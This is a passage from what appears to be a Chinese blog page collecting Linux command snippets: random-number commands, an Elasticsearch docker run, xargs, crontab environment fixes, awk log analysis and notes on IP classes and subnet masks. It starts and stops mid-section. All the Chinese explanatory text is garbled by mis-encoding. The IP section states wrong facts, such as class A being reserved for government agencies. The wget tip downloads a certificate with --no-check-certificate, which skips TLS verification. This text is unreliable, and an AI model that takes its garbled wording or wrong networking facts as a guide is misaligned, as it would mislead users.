Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9100</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">28361</span>/grunt         </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">14146</span>/sshd      </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/319.html</span></span><br></pre></td></tr></table></figure>
<h3 id="éšæœºæ•°ç”Ÿæˆ"><a href="#éšæœºæ•°ç”Ÿæˆ" class="headerlink" title="éšæœºæ•°ç”Ÿæˆ"></a>éšæœºæ•°ç”Ÿæˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)  echo $(($RANDOM))          é€šè¿‡ç³»ç»Ÿç¯å¢ƒå˜é‡</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)  echo $RANDOM | md5sum|cut -c <span class="number">1</span><span class="number">-8</span></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)  openssl rand -base64 <span class="number">65</span>         openssläº§ç”Ÿéšæœºæ•°</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)  date +%s%N          é€šè¿‡æ—¶é—´è·å–éšæœºæ•°</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)  head /dev/urandom |cksum            è®¾å¤‡éšæœºæ•°</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)  cat /proc/sys/kernel/random/uuid           uuidéšæœºæ•°</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)  mkpasswd -l <span class="number">12</span> -d <span class="number">5</span>             expectéšæœºæ•°ï¼Œéœ€è¦å®‰è£…expect</span><br></pre></td></tr></table></figure>
<h3 id="Elasticsearch-åœ¨-docker-å’Œ-CentOS-ä¸‹çš„å®‰è£…æ•™ç¨‹"><a href="#Elasticsearch-åœ¨-docker-å’Œ-CentOS-ä¸‹çš„å®‰è£…æ•™ç¨‹" class="headerlink" title="Elasticsearch åœ¨ docker å’Œ CentOS ä¸‹çš„å®‰è£…æ•™ç¨‹"></a>Elasticsearch åœ¨ docker å’Œ CentOS ä¸‹çš„å®‰è£…æ•™ç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">sudo docker run -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> -e <span class="string">"discovery.type=single-node"</span> docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">sudo docker run -itd -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> -e <span class="string">"discovery.type=single-node"</span> docker.elastic.co/elasticsearch/elasticsearch:<span class="number">7.3</span><span class="number">.1</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/33404</span></span><br></pre></td></tr></table></figure>
<h3 id="wget-å‘½ä»¤æç¤º-â€œuse-â€˜â€“no-check-certificate"><a href="#wget-å‘½ä»¤æç¤º-â€œuse-â€˜â€“no-check-certificate" class="headerlink" title="wget å‘½ä»¤æç¤º â€œuse â€˜â€“no-check-certificate"></a>wget å‘½ä»¤æç¤º â€œuse â€˜â€“no-check-certificate</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"print_r(openssl_get_cert_locations());"</span></span><br><span class="line">å¯ä»¥çœ‹åˆ°è¯ä¹¦çš„é»˜è®¤ä½ç½®åœ¨ /etc/pki/tls/cert.pemï¼Œè¿™æ˜¯åœ¨å®‰è£… Apache æ—¶è‡ªåŠ¨ç”Ÿæˆçš„è¯ä¹¦æ–‡ä»¶ã€‚å¦‚æœä½ çš„ç›®å½•é‡Œæ²¡æœ‰è¯ä¹¦æ–‡ä»¶ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ä¸‹è½½ä¸€ä¸ªï¼š</span><br><span class="line"></span><br><span class="line">$wget -c https:<span class="comment">//curl.haxx.se/ca/cacert.pem  /tmp --no-check-certificate</span></span><br><span class="line">å› ä¸ºæˆ‘ç³»ç»Ÿä¸Šæœ¬æ¥å°±æœ‰ä¸€ä¸ªè¯ä¹¦æ–‡ä»¶äº†ï¼Œä¸ºäº†ä¸å½±å“åŸæ¥çš„ï¼Œæˆ‘å°†æ–°çš„è¯ä¹¦æ–‡ä»¶ä¸‹è½½åˆ° /tmp ç›®å½•ä¸­ã€‚ç„¶åè®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼Œä½¿è¯ä¹¦åªåœ¨å½“å‰ä¼šè¯ç”Ÿæ•ˆï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> SSL_CERT_FILE=<span class="regexp">/tmp/</span>cacert.pem</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33549</span></span><br></pre></td></tr></table></figure>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæˆ‘ä»¬æƒ³åœ¨ä¸€å°ç”µè„‘ä¸Šæ­å»ºå„ç§å¼€å‘ç¯å¢ƒï¼šlnmp ç¯å¢ƒï¼Œjava ç¯å¢ƒï¼Œnodejsï¼Œredis é›†ç¾¤ï¼Œpython å¼€å‘ç¯å¢ƒã€‚æ˜¾ç„¶ï¼Œè¿™äº›å¤šçš„å¼€å‘ç¯å¢ƒï¼Œå¦‚æœé›†ä¸­åœ¨ä¸€å°æœºå™¨ä¸Šæ„å»ºï¼Œä¼šè®©ç³»ç»Ÿæ˜¾å¾—å¤æ‚ï¼Œå¯èƒ½è¿˜ä¼šå‡ºç°å„ç§ç‰ˆæœ¬æˆ–ä¾èµ–ä¹‹é—´çš„ä¸å…¼å®¹ã€‚å¦‚æœèƒ½å°†è¿™äº›å¼€å‘ç¯å¢ƒéƒ½ç‹¬ç«‹å¼€æ¥ï¼Œå„ä¸ªç¯å¢ƒäº’ç›¸ç‹¬ç«‹éš”ç¦»ï¼Œä½†åˆèƒ½äº’ç›¸é€šè®¯äº¤äº’ï¼Œç›¸å½“äºæ¯ä¸ªç¯å¢ƒéƒ½æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œè¿™äº›å®¹å™¨å¯ä»¥ç‹¬ç«‹æä¾›æœåŠ¡ï¼Œä¹Ÿèƒ½é€šä¿¡äº¤äº’ã€‚</span><br><span class="line"></span><br><span class="line">docker å°±æ˜¯è¿™æ ·çš„å®¹å™¨æŠ€æœ¯ã€‚</span><br><span class="line"></span><br><span class="line">ç”¨å®˜æ–¹æœ¯è¯­æè¿° docker: Docker æ˜¯åŸºäº Go è¯­è¨€å®ç°çš„å¼€æºå®¹å™¨é¡¹ç›®ï¼Œæœ‰æ•ˆåœ°å°†ç”±å•ä¸ªæ“ä½œç³»ç»Ÿç®¡ç†çš„èµ„æºåˆ’åˆ†åˆ°å­¤ç«‹çš„ç»„ä¸­ï¼Œä»¥æ›´å¥½åœ°åœ¨å­¤ç«‹çš„ç»„ä¹‹é—´å¹³è¡¡æœ‰å†²çªçš„èµ„æºä½¿ç”¨éœ€æ±‚ã€‚</span><br><span class="line"></span><br><span class="line">é€šä¿—åœ°ç†è§£ï¼šdocker èƒ½è®©ä½ åœ¨ä¸€å°ç‰©ç†æœºä¸Šæ„å»ºå‡ºå¾ˆå¤šä¸ªè½»é‡æçš„å¼€å‘ç¯å¢ƒã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33670#reply108346</span></span><br></pre></td></tr></table></figure>
<h3 id="xargs-å‘½ä»¤"><a href="#xargs-å‘½ä»¤" class="headerlink" title="xargs å‘½ä»¤"></a>xargs å‘½ä»¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">echoå‘½ä»¤å°±ä¸æ¥å—ç®¡é“ä¼ å‚ã€‚</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">"hello world"</span> | echo</span><br><span class="line">xargså‘½ä»¤çš„ä½œç”¨ï¼Œæ˜¯å°†æ ‡å‡†è¾“å…¥è½¬ä¸ºå‘½ä»¤è¡Œå‚æ•°</span><br><span class="line">$ echo <span class="string">"hello world"</span> | xargs echo</span><br><span class="line">hello world</span><br><span class="line">$ echo <span class="string">"one two three"</span> | xargs mkdir</span><br><span class="line"></span><br><span class="line">$ xargs</span><br><span class="line"># ç­‰åŒäº</span><br><span class="line">$ xargs echo</span><br><span class="line">-då‚æ•°å¯ä»¥æ›´æ”¹åˆ†éš”ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">$ echo -e <span class="string">"a\tb\tc"</span> | xargs -d <span class="string">"\t"</span> echo</span><br><span class="line">a b c</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">'one two three'</span> | xargs -p touch</span><br><span class="line">touch one two three ?...</span><br><span class="line">ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œä»¥åï¼Œä¼šæ‰“å°å‡ºæœ€ç»ˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè®©ç”¨æˆ·ç¡®è®¤ã€‚ç”¨æˆ·è¾“å…¥yä»¥åï¼ˆå¤§å°å†™çš†å¯ï¼‰ï¼Œæ‰ä¼šçœŸæ­£æ‰§è¡Œã€‚</span><br><span class="line">xargsç‰¹åˆ«é€‚åˆfindå‘½ä»¤ã€‚æœ‰äº›å‘½ä»¤ï¼ˆæ¯”å¦‚rmï¼‰ä¸€æ—¦å‚æ•°è¿‡å¤šä¼šæŠ¥é”™<span class="string">"å‚æ•°åˆ—è¡¨è¿‡é•¿"</span>ï¼Œè€Œæ— æ³•æ‰§è¡Œï¼Œæ”¹ç”¨xargså°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºå®ƒå¯¹æ¯ä¸ªå‚æ•°æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line">$ find . -name <span class="string">"*.txt"</span> | xargs grep <span class="string">"abc"</span></span><br><span class="line">ä¸Šé¢å‘½ä»¤æ‰¾å‡ºæ‰€æœ‰ TXT æ–‡ä»¶ä»¥åï¼Œå¯¹æ¯ä¸ªæ–‡ä»¶æœç´¢ä¸€æ¬¡æ˜¯å¦åŒ…å«å­—ç¬¦ä¸²abc</span><br><span class="line">http:<span class="comment">//www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html</span></span><br></pre></td></tr></table></figure>
<h3 id="ç¦ç”¨-eval-å‡½æ•°"><a href="#ç¦ç”¨-eval-å‡½æ•°" class="headerlink" title="ç¦ç”¨ eval å‡½æ•°"></a>ç¦ç”¨ eval å‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ /etc/bashrc é‡ŒåŠ å…¥</span><br><span class="line">alias <span class="built_in">eval</span> = <span class="string">'echo'</span></span><br></pre></td></tr></table></figure>
<h3 id="find-æ¨¡æ‹Ÿ-tree"><a href="#find-æ¨¡æ‹Ÿ-tree" class="headerlink" title="find æ¨¡æ‹Ÿ tree"></a>find æ¨¡æ‹Ÿ tree</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . -print | sed -e <span class="string">``</span><span class="string">'s;[^/]*/;|____;g;s;____|; |;g'</span></span><br></pre></td></tr></table></figure>
<h3 id="Shell-å‘½ä»¤ç»„åˆ"><a href="#Shell-å‘½ä»¤ç»„åˆ" class="headerlink" title="Shell å‘½ä»¤ç»„åˆ"></a>Shell å‘½ä»¤ç»„åˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»Ÿè®¡ç‹¬ç«‹ IP æ•°é‡ awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq | wc -l</span><br><span class="line">æŸ¥çœ‹æŸä¸€æ—¶é—´æ®µçš„ IP è®¿é—®é‡ grep <span class="string">"05/Apr/2019:0[1-9]"</span> access.log | awk <span class="string">'&#123;print $1&#125;'</span> | sort | uniq -c| sort -nr | wc -l</span><br><span class="line">æŸ¥çœ‹è®¿é—®æœ€é¢‘ç¹çš„å‰ <span class="number">100</span> ä¸ª IP awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq -c | sort -rn | head -n <span class="number">100</span></span><br><span class="line">è®¿é—® <span class="number">100</span> æ¬¡ä»¥ä¸Šçš„ IP awk <span class="string">'&#123;print $1&#125;'</span> access.log | sort -n | uniq -c | awk <span class="string">'&#123;if($1 &gt; 100) print $0&#125;'</span> | sort -rn</span><br><span class="line">æŸ¥è¯¢æŸä¸ª IP çš„è¯¦ç»†è®¿é—®æƒ…å†µï¼ŒæŒ‰è®¿é—®é¢‘ç‡æ’åº grep <span class="string">'127.0.0.1'</span> access.log | awk <span class="string">'&#123;print $7&#125;'</span> | sort | uniq -c | sort -rn | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure>
<h3 id="Crontab-å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶çš„ç¯å¢ƒå˜é‡é—®é¢˜"><a href="#Crontab-å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶çš„ç¯å¢ƒå˜é‡é—®é¢˜" class="headerlink" title="Crontab å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶çš„ç¯å¢ƒå˜é‡é—®é¢˜"></a>Crontab å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶çš„ç¯å¢ƒå˜é‡é—®é¢˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ä¸æ˜¯åœ¨ root ç”¨æˆ·ä¸‹å®‰è£…çš„ scrapyï¼Œæ˜¯åœ¨ crawl ç”¨æˆ·ä¸‹ï¼Œç„¶åä¸€å¼€å§‹æ²¡æ³¨æ„ï¼Œåº”è¯¥æ˜¯ç”¨ root ç”¨æˆ·é…ç½®çš„å®šæ—¶ä»»åŠ¡ï¼Œå¯¼è‡´å®šæ—¶ä»»åŠ¡æ‰¾ä¸åˆ° scrapyï¼Œè¿™ä¸ªå¯ä»¥ç†è§£ã€‚ä½†æ˜¯å½“æˆ‘åœ¨ crawl ç”¨æˆ·ä¸‹ï¼Œé‡æ–°é…ç½®äº†çˆ¬è™«ï¼Œå‘ç°è¿˜æ˜¯æŠ¥åŒæ ·çš„é”™è¯¯ã€‚</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">crontab -l  # é€šè¿‡è¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸‹çš„å®šæ—¶ä»»åŠ¡</span><br><span class="line">è§£å†³åŠæ³•</span><br><span class="line"></span><br><span class="line">åæ¥ç»è¿‡æŸ¥é˜…å¾—çŸ¥ï¼Œcrontab æœ‰è‡ªå·±çš„ç¯å¢ƒå˜é‡é…ç½®ï¼Œåœ¨ /etc/crontab æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨åŠ è½½å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚æ‰€ä»¥åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰ï¼Œåº”è¯¥å…ˆé…ç½®å¥½ç¯å¢ƒå˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥åœ¨ crontab ç”¨æˆ·ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤å‰å…ˆè½½å…¥ç¯å¢ƒå˜é‡ï¼Œå¦‚ä¸‹ã€‚</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="number">00</span> <span class="number">10</span> * * * source $HOME/.bash_profile &amp;&amp; $HOME/path/to/script;sh /home/crawl/exec_aqi.sh &amp;  &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;</span><br><span class="line">å¦‚æœç›´æ¥ä¿®æ”¹ /etc/crontab æ–‡ä»¶</span><br><span class="line">SHELL=<span class="regexp">/bin/</span>bash</span><br><span class="line">PATH=<span class="regexp">/sbin:/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>bin</span><br><span class="line">MAILTO=root</span><br><span class="line"><span class="number">00</span> <span class="number">10</span> * * * crawl sh /home/crawl/exec_aqi.sh &amp;</span><br><span class="line">https:<span class="comment">//zcdll.github.io/2018/01/30/own-crontab/</span></span><br></pre></td></tr></table></figure>
<h3 id="ç»ˆç«¯æŠ€å·§å¤§é›†åˆ"><a href="#ç»ˆç«¯æŠ€å·§å¤§é›†åˆ" class="headerlink" title="ç»ˆç«¯æŠ€å·§å¤§é›†åˆ"></a>ç»ˆç«¯æŠ€å·§å¤§é›†åˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># â€˜&#123;&#125;â€™ å¯ç”¨äºåŒ¹é…å¤šä¸ªæ¨¡å¼çš„æ–‡ä»¶å </span><br><span class="line">ls &#123;*.sh,*.py&#125;   #åˆ—å‡ºæ‰€æœ‰.shå’Œ.pyæ–‡ä»¶</span><br><span class="line">ç­›é€‰åŒ¹é…å‰åè¿”å›çš„è¡Œï¼ˆä¾‹å¦‚ â€œbboâ€ï¼‰</span><br><span class="line"></span><br><span class="line"># return also 3 lines after match</span><br><span class="line">grep -A <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line"></span><br><span class="line"># return also 3 lines before match</span><br><span class="line">grep -B <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line"></span><br><span class="line"># return also 3 lines before and after match</span><br><span class="line">grep -C <span class="number">3</span> <span class="string">'bbo'</span></span><br><span class="line">åˆ é™¤å‰ <span class="number">100</span> è¡Œï¼ˆåˆ é™¤ç¬¬ <span class="number">1</span><span class="number">-100</span> è¡Œï¼‰</span><br><span class="line"></span><br><span class="line">sed <span class="number">1</span>,<span class="number">100</span>d filename</span><br><span class="line">åˆ é™¤å¸¦å­—ç¬¦ä¸²çš„è¡Œ (ä¾‹å¦‚ï¼š bbo)</span><br><span class="line"></span><br><span class="line">sed <span class="string">"/bbo/d"</span> filename</span><br><span class="line">- <span class="keyword">case</span> insensitive:</span><br><span class="line">sed <span class="string">"/bbo/Id"</span> filename</span><br><span class="line">åˆ é™¤ç©ºè¡Œ</span><br><span class="line"></span><br><span class="line">sed <span class="string">'/^\s*$/d'</span></span><br><span class="line"></span><br><span class="line"># æˆ–</span><br><span class="line"></span><br><span class="line">sed <span class="string">'/^$/d'</span></span><br><span class="line">æŸ¥æ‰¾ä¸”åˆ é™¤</span><br><span class="line"></span><br><span class="line">find . -name <span class="string">"*.html"</span>|xargs rm</span><br><span class="line"></span><br><span class="line"># when using a backtick</span><br><span class="line">rm <span class="string">`find . -name "*.html"`</span></span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/35317#replies</span></span><br></pre></td></tr></table></figure>
<h3 id="ç½‘ç»œçŸ¥è¯†ä¹‹-IP-ä¸å­ç½‘æ©ç "><a href="#ç½‘ç»œçŸ¥è¯†ä¹‹-IP-ä¸å­ç½‘æ©ç " class="headerlink" title="ç½‘ç»œçŸ¥è¯†ä¹‹ IP ä¸å­ç½‘æ©ç "></a>ç½‘ç»œçŸ¥è¯†ä¹‹ IP ä¸å­ç½‘æ©ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">IP åœ°å€æ˜¯ä¸€ç§åœ¨ Internet ä¸Šçš„ç»™ä¸»æœºç¼–å€çš„æ–¹å¼ï¼Œä¹Ÿç§°ä¸ºç½‘é™…åè®®åœ°å€ã€‚IP åœ°å€æ˜¯ IP åè®®æä¾›çš„ä¸€ç§ç»Ÿä¸€çš„åœ°å€æ ¼å¼ï¼Œå®ƒä¸ºäº’è”ç½‘ä¸Šçš„æ¯ä¸€ä¸ªç½‘ç»œå’Œæ¯ä¸€å°ä¸»æœºåˆ†é…ä¸€ä¸ªé€»è¾‘åœ°å€ï¼Œä»¥æ­¤æ¥å±è”½ç‰©ç†åœ°å€çš„å·®å¼‚ã€‚å¸¸è§çš„ IP åœ°å€ï¼Œåˆ†ä¸º IPv4 ä¸ IPv6 ä¸¤å¤§ç±»ã€‚ä¸»è¦ä»‹ç»çš„æ˜¯ IPv4 è¿™ä¸€ç±»ã€‚ IP åœ°å€æ˜¯ä¸€ä¸ª <span class="number">32</span> ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œä½†ä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œé€šå¸¸è¢«åˆ†å‰²ä¸º <span class="number">4</span> ä¸ª <span class="string">"8 ä½äºŒè¿›åˆ¶æ•°"</span>ï¼Œå¹¶ä¸”ç”¨ <span class="string">"ç‚¹åˆ†åè¿›åˆ¶"</span> è¡¨ç¤ºä¸º a.b.c.d çš„å½¢å¼ï¼Œå…¶ä¸­ a,b,c,d éƒ½æ˜¯ <span class="number">0</span>~<span class="number">255</span> ä¹‹é—´çš„åè¿›åˆ¶æ•´æ•°ã€‚</span><br><span class="line"></span><br><span class="line">IP åœ°å€åˆ†ä¸ºäº”ç±»ï¼Œå„ç±»å¯å®¹çº³çš„åœ°å€æ•°ç›®ä¸åŒï¼š</span><br><span class="line"></span><br><span class="line">A ç±»ä¿ç•™ç»™æ”¿åºœæœºæ„ï¼ˆ<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> åˆ° <span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span>ï¼‰</span><br><span class="line"></span><br><span class="line">B ç±»åˆ†é…ç»™ä¸­ç­‰è§„æ¨¡çš„å…¬å¸ï¼ˆ<span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span> åˆ° <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>ï¼‰</span><br><span class="line"></span><br><span class="line">C ç±»åˆ†é…ç»™ä»»ä½•éœ€è¦çš„äººï¼ˆ<span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span> åˆ° <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>ï¼‰</span><br><span class="line"></span><br><span class="line">D ç±»ç”¨äºç»„æ’­ï¼ˆ<span class="number">224.0</span><span class="number">.0</span><span class="number">.0</span>--<span class="number">-239.255</span><span class="number">.255</span><span class="number">.255</span>ï¼‰</span><br><span class="line"></span><br><span class="line">E ç±»ç”¨äºå®éªŒï¼ˆ<span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span>--<span class="number">-247.255</span><span class="number">.255</span><span class="number">.255</span>ï¼‰</span><br><span class="line"></span><br><span class="line">Aã€Bã€C ä¸‰ç±»ä¸­ IP åœ°å€ = ç½‘ç»œåœ°å€ + ä¸»æœºåœ°å€ï¼Œè€Œ Dã€E ä¸¤ç±»ä¸åŒºåˆ†ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€</span><br><span class="line"></span><br><span class="line">ç‰¹æ®Šè¯´æ˜ï¼š</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰A ç±»ä¸­çš„ <span class="number">10.</span>X.X.X æ˜¯ç§æœ‰åœ°å€ï¼›<span class="number">127.</span>X.X.X æ˜¯ä¿ç•™åœ°å€</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰B ç±»ä¸­çš„ <span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span> æ˜¯ç§æœ‰åœ°å€</span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰C ç±»ä¸­çš„ <span class="number">192.168</span>.X.X æ˜¯ç§æœ‰åœ°å€</span><br><span class="line">ç½‘ç»œåœ°å€å¯ä»¥ç®€å•ç†è§£æˆ‘ä»¬å¹³æ—¶å¸¸è¯´çš„ç½‘æ®µ</span><br><span class="line"></span><br><span class="line">ä¸»æœºåœ°å€åˆ™æ˜¯åœ¨è¿™ä¸ªç½‘æ®µä¸­ä¸åŒè®¾å¤‡çš„åœ°å€</span><br><span class="line">å­ç½‘æ©ç åªæœ‰ä¸€ä¸ªä½œç”¨ï¼Œå°±æ˜¯å°†ä¸€ä¸ª IP åœ°å€åˆ’åˆ†æˆç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ä¸¤éƒ¨åˆ†ã€‚</span><br><span class="line"></span><br><span class="line">ï¼ˆå¸¸è§çš„æ©ç æ˜¯ç”±ä¸€è¿ä¸² <span class="number">1</span> + ä¸€è¿ä¸² <span class="number">0</span> æ„æˆçš„ï¼Œä¸è¿‡çœ‹ç½‘ä¸Šèµ„æ–™ä¹Ÿè¯´ <span class="number">1</span> å’Œ <span class="number">0</span> äº¤æ›¿ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</span><br><span class="line"></span><br><span class="line">é»˜è®¤åˆ†é…çš„å­ç½‘æ©ç æ¯æ®µåªæœ‰ <span class="number">255</span> æˆ– <span class="number">0</span></span><br><span class="line"></span><br><span class="line">A ç±»çš„é»˜è®¤å­ç½‘æ©ç ã€€<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B 